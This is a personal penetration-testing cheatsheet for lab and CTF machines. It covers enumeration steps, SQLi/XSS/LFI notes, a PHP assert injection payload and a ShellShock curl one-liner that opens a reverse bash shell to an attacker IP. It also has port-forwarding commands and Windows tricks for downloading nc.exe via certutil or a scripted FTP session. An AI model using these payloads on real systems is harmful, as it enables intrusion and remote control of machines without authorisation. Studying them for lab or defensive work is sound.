# My Notes / Cheatsheet
### Last Updated: 22 Jan 2020
Notes related to Vuln Assmnt/PenTesting 

#### Approach for Compromising a box
> 1. Identify open ports (**nmap/autorecon/rustscan**), enumerate ports (TCP+UDP) for services.
> 1. Run **gobuster/wfuzz** and identify DIR and FILES present. Try using 02 diff wordlists. BurpSuite also has crawler. 
> 1. Run **nikto**, Have you read the source code ? If its a website look whats running ? 
> 1. Wordpress, Joomla, October, Phpmyadmin, Mantis, Adminer etc.
> 1. Running tools e.g **wpscan** or **joomscan** can help further enumeration.
> 1. Try running **Hydra** with HTTP module for brute forcing.
> 1. Cewl can be used to generate a custom wordlist if "/usr/share/wordlists/rockyou.txt" fails. 
> 1. Custom built web normally has:
> 1. SQL injection - **Authentication bypass** & **Database dump** & **Upload malicious file**.
> 1. XSS - Alerting messages and getting cookies
> 1. LFI - **.php?file=/etc/passwd** - Try fuzzing it with WFUZZ. Reading **LOG** files to acheive RCE or Reading **SSH** key files.
> 1. PHP assert ftn to bypass - e.g. http://192.168.10.30/index.php?page=' and die(system("ls")) or '	
> 1. Command Injection - Try Special characters e.g. " ; , | , & , && " etc. ${IFS} is space --- Can help in achieving ComInj. 

#### PrivESC Methodology for Linux
> 1. Creds file or any misconfiguration file? (**find or grep** command)
> 1. SUDO commands this user can run ? (try running sudo -l) 
> 1. SUID binaries present (use **find** command or **suid3num python** script)
> 1. Is there SQL database, try enumerating it ?
> 1. Running ports / services on this box ? (use **netstat** or **ss** command)
> 1. Pspy ?
> 1. Kernel or other exploits e.g. exploits for SUDO ?
> 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**

#### cgi-bin folder or ShellShock
> e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
> curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh

#### Portforwarding via BurpSuite
> 1.  Under "Proxy Listeners" add new listener on random port [e.g TCP9000] and select option "All Interfaces". In "Request Handling" tab give the IP and Port [e.g IP2:80] of server you want to access. Now if you open http://IP1:9000 it will redirect to http://IP2:80

#### FTP download a directory 
> 1. ftp://192.168.75.65/Logs
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//absolute/path/to/directory
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//Logs
> 1. ncftp -u [user] -p [pass] [server]

#### Portforwarding local service 8080
> using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
> socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080

#### Portforwarding local service 5901 (VNC) - HackMyVM Box Level
> 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
> 1. there is a service running on port 5901 locally.\
> 1. ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
> 1. From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
> 1. Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
> 1. **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901

#### Fuzzing LFI
> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
6_64; rv:78.0) Gecko/20100101 Firefox/78.0"
> 1. wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathto
test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http
://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x8
6_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP

#### Windws Tricks
##### Download a file in Windows via certutil
> 1. certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe

##### Download a file in Windows via FTP client 
> 1. on Kali box first install module of ftp by running: pip install pyftpdlib
> 1. start FTP server: python -m pyftpdlib -p 21
> 1. on Windows box type command: echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe 
> 1.  ftp.txt&echo bye>> ftp.txt
> 1. The above command will create a ftp.txt file which will have commands to download the file.
> 1. Finally run: ftp -v -n -s:ftp.txt
> 1. and file will be downloaded. 

#### PrivESC Methodology for Windows
> 1. Look for exploits on -> https://github.com/SecWiki/windows-kernel-exploits